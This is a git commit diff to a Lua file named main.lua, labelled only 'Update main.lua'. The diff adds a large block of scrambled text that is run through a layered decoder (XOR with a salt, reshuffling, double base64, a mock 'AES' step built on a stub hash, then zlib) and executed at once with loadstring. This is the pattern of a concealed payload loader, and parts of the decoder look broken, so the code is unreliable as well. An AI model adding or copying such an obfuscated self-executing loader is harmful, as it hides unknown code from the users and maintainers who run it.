4aef312d3ad9f88abe99e5608b8c98f2a4f96cab
CHIEF <brennoezequiel2026@gmail.com>
2026-07-17 14:30:09 -0300

    Update main.lua

--- main.lua
+++ main.lua
@@ -1,9 +1,281 @@
+--[[ ============================================================
+        la ele bem grandao
+        ============================================================ ]]
+        
+        
+        --[[ Anti hub ]]
+        loadstring((function()
+            local data = "c0cec4e9*%\fqD
+Vw`hSf`aN6_
+Gyt|Wu2|XwSD51o.nokUot}bznS@+yz71va;(a~k+_+}r l1c|eD
+gN\(a	&`~xWZVufcgXvbb|`H QUWFk~gdxMgw Ly[3&dC^E?"aE@ y[y!'Uqbuc~.Sb_8\'Pwl3C3g7 YQyk4|BfvkHjV99	be2z`_|Wk`aB
+e	n wB0TPe}b`d\Ueya$
+SyV93WN1^XYwsa(QsIg0ghd9#?]j"Gvd~l]bY)fN=#0Qe^m7
+Cc.rf`\/SfqW`N7eQ9flvPt^^4*\W{`gb6UU5x|yQfc3pQaYyhpn]VjhV\shf|P	U6dww}{qHP|_FxhQvVzv6wgiQ}WJstEdD7kq7-\b|~/wp70XD{4'g6|#Q_PrX6~\/p;C8e&v
+Q`tbw`kz g}Zj g7Pdx	4 ]sQDwb4T ~SWzy-x?Tg
+xef|	t@vc-;xQP +@d^S},sWvxm/jebypYde\yTcglw
+f06|TXkb^Z2VxZ'0d7Yn T`DWZrfzW5l`XQx^+Z{PwgefZQ('?/a6
+k4_Y{zaWAe9t7|[n#Q|7_\tfwpV_dt[Ph<Z`|QM~| e
+)X[4P5a64z\
+ q}vmt3uYbt]KluK
+wSU[1#fQF\Nbf]xARy6	 PoDikSf2g2_orj[C~6  jaa7|P@op^ Q[r2h
+f lchliqsCaYBjd~YISm,#Z4_^7YPVeu\\t#YVfbGfQ+wKw}TTdJ^Pw]0Xu5T$Keg_cCf/tl_aPN[fhdb2Qg( n3GPuZh	F@l3P] wegHfg'f\2gqT[\akz@h8n"uHc[^		Ps4YT03Trd!/bC0WQLxw<9x|`PE[Y;t<`7y_o
+=	FWdfdz|v3r+VyKdp~
+WWWmH
+?rRtB{tz]^B*R2jVbzFWYDeNmP
+fw+4q'x'ku6z]c!
+ndaki_2wnv\n43-VQuk$WO| kldYVqX	z\`_ch_TZd7EVXfq	taD{dePQ=d^6]Mcegc@~
+FdpV3`g^`WrdTkcQv\
+k|wzAh/YwVZ\%zw
+z$x]r\S2
+h_Wb2\C\tu'vMeiOQ#Zboa]gY]Q^bA`PLcla^1}
+d^aUrt\qn+ngY/?trR3[s!P`}Z]z8fbVI3)`|SvlS@E
+S|UC3]3DEanxC[D4d07hUdQewaD.\QZv|uPpc-Uub ] e\rS[qdje^Sek6dwUAyZ|vP[n+<fv;qclffbWT5Sfm |ad5z?SPbahwo7u~|d/.j/QQU|j6*dd|ttcMbzXo#S4aX<Xkq;yg
+yPmQ]haYf8HcWguR|9uhP=!d`Sfy~ Pf ZLP"dUQdz^Q\P6S'}\x@UXLKQ)
+8c~\|pS ~?C8
+ew
+UWr~20Vp_4eP7mvPx+`Xd$zWn `47g	~TgGq2uuU XNbxso\fT%`M
+3e6|w;wHUmgU?pt4kNf^`v	]w(s/mP^cCw+@YDHQLex[d3 \a}54Rqt}\VX3^szl6_`Q0UyTW&m\cz1
+T@e]F2kjFSv|C2c
+lUP}nIS)niXv`D}BWn&zkk	|X+bQq/nH7T{6s3%ofqVowra}e]Xk_[[B6QfnMbbvY3$Sa\'#jz]d\Aq@ZRlg|j	Wkv^r25`
+8 #JczC*B!oQr.%gh\Kcg3f\  xr|\YX;[h
+5qU7CQSbsVfRdnRa_P
+cZ||xchwfTbgQeBX\6ZgXtzScq|xgX`,cqeSEV5v-fz7|BkWkWfZPok
+\G~zj2GHtuWwQ@Z7wk[2f\bSfvlqh]^KQP4.hbQeV4SW2A6j]PJVZgytDf(+%Bj Q[dV_`X,h CTPlQu_Vj3Un^|bIW~@eZ hwhPfnJ6kQ^7m1tphAB~jf2.p3RQNX|WrVj?|v33vRHXz0cd$UTyaJolXxRQ WmPveq_ky}l|,X<wtH`kyb\lws71X'ovnYFA2SzbjZfo2P}VU0
+^VL6qz)hIzqxTm7lsw|a^^s,j\I{t'YccPu
+wgf3#7F#W3adUy?w|=}6u	SB4Jaf?4ZSV0[@6buf3w3Zea6\Af
+sg6jYBw]DQC1ztfce	nSj}^h DxPMXNzr||Q/mPd		_B.X|;X
+oXeW1V}zel5c
+}f^ehrV0t|FyjLbah YF37eS<]
+@d.hfTQQnaDv`"ntW	5UH~feE/HTSg#fbQx@gHx=samVc\AURjavj<(Bmn[btfC3qbX2{} Q
+Tu,B27s\^y}0AQsDg6wtBRUbQY%fakK	jffdNj
+ j
+ggRYdPf|D<Vc v*/Rwm+q2YJh0a4]hc?UPYP_,aAS_z9bv2
+bVwdQw[JZTNhR_[)]Hec]zSgY`c'mmn`XP1'F[6~P h5/b|w c0v@mkY@Vb[,XfsSq&CE0K3rN*6X)2@)|\7Pf+s	(ag#e h _f}cEf	ho#\wD{4Qz[VQWZ( nkV0sSv+
+X{QeSf+qdDguFag10zAfdwuxvkWC}SUh_^X`=@@Q?]qcSeSfwAwUDd@AyCam7/e6wnX~fQ_UTVg3#qff|/mVr}Y^teu+^`|YRD4`gNl^Q]WH
+I@yEhaP0caU^#aZsydq|$QcUSSzScJ}a0{oujwWogSblc+Z}d<Uxg!jhWU_^c$`CWvZ|u"S^PG
+RZ.d @Pda@XPiNf_w ZDf6^\AQQu/PYb( _xUw7e`dWo{kD1Xz{W]r'ags{y|ZX'gvwdu\}0Rk3]Tc Wle|#'3(WW\aBf lBdX\P\zI	WAfw(Hr
+~mmfu;WKflW-Bz\QqF`e67[ejmbj`V;uHb'/sijj`SQwlatk~PWyY
+ov\jt}@wfTUT#vXz5bn `bqX0S\]i`A4Ug{MZnqWjt|bgx#EKS S``Q_hpC/
+draw#3\YguseZ|XBv1t#i*%b0w7A`wX9rZ
+P ~Vdc mVEkf|P+j+s/5@a6bA7 gP4N/A dhUC`0;xnh ntQo })VqnS)3`KP?cc`\cyV~`dzsbT#\c}Zu5`+g}f3X}g^
+Znjj~t_dcw7P @I'2CzTUbVc6Pa`\LMSf?mZ5;Rgbye\z\y4exfWjAQQ\Jv~edf^Q7Q@`muXCwPbt_Z^jzd L~TX']opLjaw`!`	y`	~nu]4(d
+Z8R( `Dg\urM7\{cj[e/t9h(X
+~[4RV QQ
+DQsmXgQzsP	^z2\yPXDycHj	fHQx2C_]XD0aJ[66^Buatk+ rfjgSsU3&#sWm5$d \Qv?fjvzps.,ezPwv+QmcJWXI|geP&StaUeZ=WBtb/vtzdT?(|fqvShs
+u+ParzY@fd\tTUZLbo`cafJPu*MbSTr P#%`ggC'V0|n_hU9VDD0VTQ5ZtmHf^BIeQ^1WP}q^ZQ(l-cq~QfQ\og0dXo`\u0d	hM}|D[KD@chwQPchTu~  Pc@*cD
+ mg
+XM O7d	vw\ZaK`x
+0njyEg
+UYV ||fje
+`3[
+fleIJ]Q0(XfZPRU?fObj|'t6JY{N?eW3khfzZnt 0ux\hj
+J`
+P]23KtqcvDxQR\vVh1_3+awgEVTZsSaQqhfn_WyrdFAfxh AQgD`JhvvSzQ$hf|gCMHVW^vF%*
+Whung4UkwcmNm
+#zhk7 4~1ddGya6u%lfzXxwg
+b@t@f!XNdawSZlYwX1blz3Q@SagGtrQ+Z}S=cC	HQQyqkcxueK{~ffTHpm<E3Y|/ `Xc$?Vi AlcEJb%Jgz	JdXCp+RY#'yQjR,
+v@`s
+nt\5
+@{UB~d]apfPD eYj0$zo_cYFfXbG~chx64~nc^ +'e |	<VtF6w
+pd|~`#+Dcra
+Pgd`cXq P#	r{Qkz8o*wU#5fw5Tf fHx{|`qtrd;f^ty@g~V^`(|sg+cgH/nNhP=|F`b)QsoBcap*
+6nD4gU/	MVde'K} c
+zj
+	vPLcU}abT4P`7fpekZ^R`af4W c
+SPlfkWUK|Tbw6
+jB@0,_Wm_JQF [TZZow_S1s#3HXn^gH]lnb2&JjPfa[fa
+4^Pdb/XbXJWX0Uc]/	r
+PX{Kn~rR\ntu^`mN(V
+l_ga31`tgbzf93en2WvtPQy-|`5[0{1axQ_Tanyc
+P!#WV0Z(c) tvKW-\u{0g[DP~zPy[SXpW[	xXqP+dzub/`=a4`gUN]C`scgnd@t4M_St|Xg~'TfU<f 
+mHXZ0]-@VvJ)Xe_[MhlPnZv|zGl)QxjJ?ySRaZZ@3"2Y1s
+bUUosz|?	~hVDNQymcFwfv@Q5kEQ
+A	]_VfPPc@{dc
+Xtlk
+mp0rnjf^ck/1ahBhl-Ny0
++\h ]aLgZTuPbc60iZW&Xhy`c|sP`adZf#bbW2iCwQhTpf4
+jNVpaEtQe|Z$	`&e|V[WjwSxu`@k^{&dIV4do@om}d=ftV$	EXx0fcV6C4Fi6HS\ugXwmeg|QvcH
+JnW-bdlJQY#}u|@ mfx\7tj1QcglUSZXNalVNV9antnV)'|\vzeI2d`t`C|kQ2i1	VRHj}hCzV5`bhP\{+!zu[ehT';U#w\7\fW-~`R91|
+6Dc3x?p q3+pVNc,	z+YWPVcd0Sgv	r
+BSaDg	?a74zvRPbs[	kfY@gZf~}~[SQ1z o|	=pCxm1fn\yhPUm4Z5	V{ggXu[kZjMyVJ4+vs3\f@Q^Zv~f]acEvdwE,1Sa7QPtfg3]D@a@cjX])Hgq`e^DuQ`X{_(aWWZP0QeZ_T=CkT'j(tT}f f+fQW^ghctU_X	~6ePPXn-v}h{fhl0b^Xjiku|q3
+dN\	+U|5W|aF	J?T/U9`Z$75'g~mN|]($zE`_X \p`23PZ@gLabcatt,fRX.Q[w(`YzWu~UWVn SQn71_D	e_Hf]X 7'a|tf	Qz~jko]cwnmEdqebM27Af<s`Uj;*U_/Wbqg23u/Yz"Cxed@`(Ps|wbf6Aagb[a47Pbj]Qwuwcgq$PoQ?7^rMjvgr$B-z[\z6	h,P	jkwd@b
+^XwSVhwaf\7XFmr3
+DWc	C
+EQlce[0|"gaR;dhd&T\Bglkn|6l@ f}CvJUIgj93,C.^3qnW`DfbnWCtzmL
+|wDp|6tvB0jSj~SaHxAtlf_~}k1nw7kL.?1uprGM\53YzF^dJcbhyHw_V^dK[bnSke$lcV3f^cg6d|_WW|j2tf7pE`^r\`	;BVb7dh]D*C,Wr3e\|~Txq~BKUmzX+v`0E`YhQ7"K[eh@aKa YzP|'-;2dk%c^DaeB\7b, bSBbxtzSb3TY\Yr9YF66k$LFWufn&FS03ad^nu4Z6}kPgteXJnggAw+'_~WLW/mc.To _~Tda&]rJt*Bccx7/hgBP^UL'R7T6xvWn^jTCCb^'*+Czf73c
+RndjQ_UR 63QUV;j,Xr~~)f"h|Y3FN_B&` ndRePvRuX3dlhR`*UYw0Db`	|XUS	7	~dq`L,X0l_`	4`XjVtdnx|CRjQq\gbW"/Jojcj@ZUg`IuWV}w|`N'Td[ceX0a_P`RYH4iD+f ~{7\je^~VYuDPeo|aYv)`UQ_|zpdL;WP`
+N Qjrx?c`3uP4gtPU+
+ PL^mv,\|ebgAuxy1f]uV/fcogZQh7v1aRW|_y(Jjew
+_J4Qe;sjz#na_\V/`^'hQhgQ7gozvo /j4Kcwaqexd3[VXs^D,#+3jZtpeCSt2hx(_^tVo@ gbp0+TffT7f@hMeWb
+yImYeqkS#P8p`;faf`_URc}h{/*p6
+YZQg2{cna4I,Qa`_| vf\tg4{`+QBJ`x;0 4t`bU[1^_e/Aa]JjlXqMwN~Ss tWu
+-f^fjbf}`~j+t zgnwBr2HpxUVab{
+z60`axo`jOrZ{za6qUsCccQ
+_}dPU
+g
+rT0c|cqU2XZ3dc6&
+dgqjZPcTX~_}\=~A5gghdQfw/_}cApt"W_Rv|[7szuC3^SdPPV#U|teA`@fMbb@;z{Cf]SL {VG3]'3csAzq3U}Hi]'TVU uBQk_n'fUjxcb Rk['~`fP3<7t	)uWYAb(cAe\ZFe7YP
+n1P 8d\vyU[3|SPbz+;QXeKloNd 7fyjqnedUbZkedh;fWmtMH|R+UU+d	eW
+bzW;d~6#Twdaz_S
+b<cr#c
+.UV1;jh+6DTz2zb^uMawIW$q~fc_P)zQ4cV\'e5#XU x 	Wy]_$t3dX+a,u6M
+<d'FctEXm(GWlzhf{~WeYN4zjxxNF+lp k_q+f|yCw
+`w1X|rjq_XhVb#txnQz*y0
+fz'7\LvWo7vpXb~cVmC#Uab6\hc6Xba|p]` M3E6dy`u|$6h }
+ctjiVdtybU_fg|7NSv7rgLf_t\{e
+"hcvc=klvPxaffgKb]/5b1iaU-<	fX){'HBZ}+ ^)ZAKVu6Z;QYwIgNzVfc`@aaU g	c|a5#^F`#WUd}q	`z_DwmnUb]|QdP2
+cJ.\h cQbu
+e4]m3G^mf_Q`amd3vTPc_oaN	gH7^gnquZnxrpZX_HT44tg3fe6cba}uH)Ha|SPbr 
+5eP.Q	Dm]P0c}3yJ~qLdw|2kmaU{bnMU+(`~c]}MbX; RqZf2[2
+|\Ya7@]t|
+fd~
+bUf4ye@_J^bu\-{}\$ZGTtyNUtfr]+oDbXXDqe	~?]sWa~)UBCn]H`~Z[g3  ~fSSDv6X
+.lXgUI0247z~/	XtU|tm|)|TDm`})b;wa4ka\
+`f`b}z{`d`b~g^NzTd
+GB\vAhjuXW",Q {Z^]\g]X3i?
+T`sV	6]]Q2@~Pc	z]	a{yX9|zBgqM"oH\7$gf[P~1HrycV_k9\BSYB`Zt~f]abg|`!hY3nj%r)U3Y[Bc gSM&LR
 
-if pcall(function() 
-    if debug and debug.getinfo then 
-        error("debug") 
-    end 
-end) then
-    os.exit()
-end
-print((function() local t={(25+3),(58*1),(3*1),(0x4),(6+40)}; local r=""; for i=(1*1),#t do r=r..string.char(t[i]~(126*1)) end; return r end)())
+eFvs@\ct
+lo['blcw {n!P?RXE`@XRp~<Trd;'N^H;bgav|w n$ZzPqKU
+tbu`Jq_U3r0P7/`z
+bQjfhVXQP42B7\rPfatf$hmpP y}knWzaek	f!Oz|5a3	a`dvw#CbvsZk[|<
+b"\Z#(CXf Jj^c- s|bj\Wupj\eKg$m?{{KfYYUR	@||Qw/a`sytj!W3xZeACa]fTfT\tnuuh \7@2Zz_WJXkt~(p Xv^_P |ZqazX aFY1qO4Y@D`w)fvynalB\){gSYAfHQP$cGb
+cF }m	[65#TUXh_?TXRXahd^WV|5egVwDZp`ftQ4_eFut hvww75edh^cQWleoIRt h7fo~J|	Yj\}]`w"|ZpQKD<j[~{n1/KkH3;Cd|zE]p]QkTeEbrXsfPR+ ze~jaq3PXba}}Ril/gPcps`_uvqD_RiN~0zD1kwm+eUZc|FmY#t`
+x'8?QsAVg`Xw]vQ[^3S)@wcKUd@nVQ\QU[	C	svsJS2VfU]mYAl@
+"v).Urdabwlbf gBm7j,")|abd3qUv6g\~ZE_~uH`^aht \@U,XP
+Cij
+Ngw_^p{mvu]hrfbX+hgc^~SQmWS3rbsVYKcguFFe2whdqwl |yrU.c(sbYU6Z\w}SGy|K.1c~R@
+[e]	K3a
+AglB0HhbZS7ygl{z3
+e 4IIS]xtjCVZaXq
+F9Fj f1zl
+^asxesy,#xP+g2eutf^3t+.g7
+I e|S Z`rQwxHbqdJWVFgU~XtYEmX)V G2`h hrtV~wYBeQT`h76
+
+qfqdSP\"agq\jvj'` j%P\s*gtt3^U`aT`^Vmy}n~/]u|YD)aQaN0\y9P
+[B]|YK~`T/S~~Pa|fX`lmSZ~XKoe6Qk|^hYv_Uce	eY#J+]fS(v2~f!~v\X{2cefD`K}wV`e3Qscz|zxU^t)begdlb%wes4ccpD@xV7 uZ0?J`ttdP/a3EZ_Pg}W]\askUR3bd?cDE \JCkzFl`6PpNbk
+6
+@'ix4b0-QhXx[ 3Y
+#w 
+FPeQ]h\hHUxX,cesBau;q 0R7g+g	CfZ	f
+a7^teP\+aBiNlWf|PunT"/-zsg`_3 XKQ~h
+|*`p?h=;c4Yrf}b\tSk	XB`V{aZ	z_0o0]R3?eZlb~u
+t
+h(qb/taXYfQW\$]WLcg_ZR|Yt
+IyNq\C2b0eygaRYB	fU$wb#FrddqQj0Da\8_
+[od_rN;6`ZWIPS?V~g	a0e7u7|	{]gUPpP4|
+EgftbcrxgPcU
+)dFa$@N0H@2aXruh@?H`Ac[z+bq#oXVsQ	CT	kexm_g|psA.e)|[pZPxtYHSVwcLED4 PHwBJ;?cdW_Lc6 9xzvT\Q7qmkT7c7X}@W3f~t1b'V n\uXrL"jB'RPKjURh+WyJgazn;z3wZe&&tP5dfVA+v
+CyF*P{|["kRC7zz|	nT3gmbVXDBCHzmn
+~'tz^o+cs
+Q6nC;tZ}TZt$CZJyHcb@TScmY`M_\nr~n3'Mm\Qv9] SJbXpy^DSulwz_b@Q{X0/
+6
+Bt+
+^nJ,jPF`P^_ |\[{VJ[DagcJwNs[3zdhHjsJ&nCSQf_L~6Q21~g H sA3j]| oZPgSfJdq^Xd~J{SU
+f_c FxaTYdufuQm5+WP}kjZYgPwvXcUjS|IbXdPvms\}|Xv
+bwPXmXqDhc*upuaZ
+wqhbbpofzvw<9cmQa@cHq_ ws7c;0Ph r`dr0 evUgrTFS`rUbt`4Rnx^rcy]W<g73"~QZVblbd	C`=d/w`/r`Hs/`P5GQYI;|a6SX\`Z{h[e]kKe7	cqjPf5w4vqMygt
+D H+ygt(tZ2zV`]DdVPl'7Y{]}~g$bW_
+g#0'z1~wcrQalY02r!(Tea^BAr0wv	v	f24ZU`
+Ua~xcSMYQuf`_~cHT[VNf5JWt{W\KXV}WxiT~wkaWt4aZ[et`PBc UUW<bx
+a*eYF
+nc[5t&yvUghM^1Sa^wrQy\fvZhfeVjyD1/&Qd{*d974_eSQdp5 GVjCUgyNUWQ/T0&6fm7CcsD_|dC	fc;rhcz
+lcUW[~](qFZXmP^T\zQpWwnLgr[l7~ZiFv,|,R
+Be[tf&UQtj{W9BogXt2Mae^6g3TU66RXr\al^10f\ xLf\ cY/`\CTSPa\\`VHQzE^7?\]o2`	S|Zt
+{M2w7$^6v]-^cYV@.\
+apj-/~\'baMsG{Q~mz~_\g P^.qTXVk0apS`^sBfZ]BH|c+Nx_Sesfg
+a^P(QZQ)txa0
+
+rE	DxQhcRta vqa@3^ VwQAe` <
+G+Uq|WfSBwQ@rOz^nZX`GFQedzU	\B3\U5fd7S!`obUwkf;\W~FeU*gj|jfPBAQX#E|StVZT\tGz4eVM{VQS[l\sL@gdHe0RujF_1Pfy_b@y-e[@xy^]XtyQ_r30f7)6CR2P^Mc_bpXQl-_xk'ucV[Q ~tb|x Lh]PgXfmuUrfn[)`pd. {g
+.gg
+ckZ Q |Zlg"
+            local salt = "0292e44a"
+            
+            local function decode(data, salt)
+                local chunks = {}
+                for i=1,#data,2 do
+                    if i+1 <= #data then
+                        chunks[#chunks+1] = string.char(string.byte(data,i) ~ string.byte(salt, (i%#salt)+1))
+                    end
+                end
+                local reconstructed = table.concat(chunks)
+                
+                local function unshuffle(s)
+                    local parts = {}
+                    for i=1,#s,3 do
+                        parts[#parts+1] = s:sub(i, i+2)
+                    end
+                    local order = {0,3,6,9,12,15,18,21,24,27,30,33,36,39,42,45,48,51,54,57,60,63,66,69,72,75,78,81,84,87,90,93,96,99,102,105,108,111,114,117,120,123,126,129,132,135,138,141,144,147,150,153,156,159,162,165,168,171,174,177,180,183,186,189,192,195,198,201,204,207,210,213,216,219,222,225,228,231,234,237,240,243,246,249,252,255,258,261,264,267,270,273,276,279,282,285,288,291,294,297,300,303,306,309,312,315,318,321,324,327,330,333,336,339,342,345,348,351,354,357,360,363,366,369,372,375,378,381,384,387,390,393,396,399,402,405,408,411,414,417,420,423,426,429,432,435,438,441,444,447,450,453,456,459,462,465,468,471,474,477,480,483,486,489,492,495,498,501,504,507,510,513,516,519,522,525,528,531,534,537,540,543,546,549,552,555,558,561,564,567,570,573,576,579,582,585,588,591,594,597,600,603,606,609,612,615,618,621,624,627,630,633,636,639,642,645,648,651,654,657,660,663,666,669,672,675,678,681,684,687,690,693,696,699,702,705,708,711,714,717,720,723,726,729,732,735,738,741,744,747,750,753,756,759,762,765,768,771,774,777,780,783,786,789,792,795,798,801,804,807,810,813,816,819,822,825,828,831,834,837,840,843,846,849,852,855,858,861,864,867,870,873,876,879,882,885,888,891,894,897,900,903,906,909,912,915,918,921,924,927,930,933,936,939,942,945,948,951,954,957,960,963,966,969,972,975,978,981,984,987,990,993,996,999,1002,1005,1008,1011,1014,1017,1020,1023,1026,1029,1032,1035,1038,1041,1044,1047,1050,1053,1056,1059,1062,1065,1068,1071,1074,1077,1080,1083,1086,1089,1092,1095,1098,1101,1104,1107,1110,1113,1116,1119,1122,1125,1128,1131,1134,1137,1140,1143,1146,1149,1152,1155,1158,1161,1164,1167,1170,1173,1176,1179,1182,1185,1188,1191,1194,1197,1200,1203,1206,1209,1212,1215,1218,1221,1224,1227,1230,1233,1236,1239,1242,1245,1248,1251,1254,1257,1260,1263,1266,1269,1272,1275,1278,1281,1284,1287,1290,1293,1296,1299,1302,1305,1308,1311,1314,1317,1320,1323,1326,1329,1332,1335,1338,1341,1344,1347,1350,1353,1356,1359,1362,1365,1368,1371,1374,1377,1380,1383,1386,1389,1392,1395,1398,1401,1404,1407,1410,1413,1416,1419,1422,1425,1428,1431,1434,1437,1440,1443,1446,1449,1452,1455,1458,1461,1464,1467,1470,1473,1476,1479,1482,1485,1488,1491,1494,1497,1500,1503,1506,1509,1512,1515,1518,1521,1524,1527,1530,1533,1536,1539,1542,1545,1548,1551,1554,1557,1560,1563,1566,1569,1572,1575,1578,1581,1584,1587,1590,1593,1596,1599,1602,1605,1608,1611,1614,1617,1620,1623,1626,1629,1632,1635,1638,1641,1644,1647,1650,1653,1656,1659,1662,1665,1668,1671,1674,1677,1680,1683,1686,1689,1692,1695,1698,1701,1704,1707,1710,1713,1716,1719,1722,1725,1728,1731,1734,1737,1740,1743,1746,1749,1752,1755,1758,1761,1764,1767,1770,1773,1776,1779,1782,1785,1788,1791,1794,1797,1800,1803,1806,1809,1812,1815,1818,1821,1824,1827,1830,1833,1836,1839,1842,1845,1848,1851,1854,1857,1860,1863,1866,1869,1872,1875,1878,1881,1884,1887,1890,1893,1896,1899,1902,1905,1908,1911,1914,1917,1920,1923,1926,1929,1932,1935,1938,1941,1944,1947,1950,1953,1956,1959,1962,1965,1968,1971,1974,1977,1980,1983,1986,1989,1992,1995,1998}
+                    local result = {}
+                    for i=1,#order do
+                        if order[i] <= #parts then
+                            result[i] = parts[order[i]]
+                        end
+                    end
+                    return table.concat(result)
+                end
+                
+                local function double_b64_decode(s)
+                    local function b64_decode(b)
+                        local b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+                        local out = {}
+                        for i=1,#b,4 do
+                            local a,b,c,d = b64:find(b:sub(i,i))-1, b64:find(b:sub(i+1,i+1))-1,
+                                            b64:find(b:sub(i+2,i+2))-1, b64:find(b:sub(i+3,i+3))-1
+                            if a and b and c and d then
+                                local n = (a<<18)|(b<<12)|(c<<6)|d
+                                out[#out+1] = string.char((n>>16)&255)
+                                out[#out+1] = string.char((n>>8)&255)
+                                out[#out+1] = string.char(n&255)
+                            end
+                        end
+                        return table.concat(out)
+                    end
+                    local first = b64_decode(b)
+                    return b64_decode(first)
+                end
+                
+                local function aes_decrypt(encrypted, key)
+                    local function xor_bytes(a,b)
+                        local r = ""
+                        for i=1,#a do
+                            r = r .. string.char(string.byte(a,i) ~ string.byte(b, (i-1)%#b+1))
+                        end
+                        return r
+                    end
+                    
+                    local function sha256(s)
+                        local H = {0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,
+                                   0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19}
+                        return table.concat({string.char(H[1]&255), string.char((H[1]>>8)&255)})
+                    end
+                    
+                    local key = sha256("2541735b352cc8a8f38c88badd796913" .. salt)
+                    local decrypted = encrypted
+                    for i=1,5 do
+                        decrypted = xor_bytes(decrypted, key:sub(1,16))
+                        key = sha256(key)
+                    end
+                    return decrypted
+                end
+                
+                local function decompress(data)
+                    local z = require("zlib")
+                    return z.decompress(data)
+                end
+                
+                local unshuffled = unshuffle(reconstructed)
+                local b64_decoded = double_b64_decode(unshuffled)
+                local aes_decoded = aes_decrypt(b64_decoded, "2541735b352cc8a8f38c88badd796913")
+                local decompressed = decompress(aes_decoded)
+                
+                return decompressed
+            end
+            
+            local decoded_code = decode(data, salt)
+            return decoded_code
+        end)())()
+        
+        
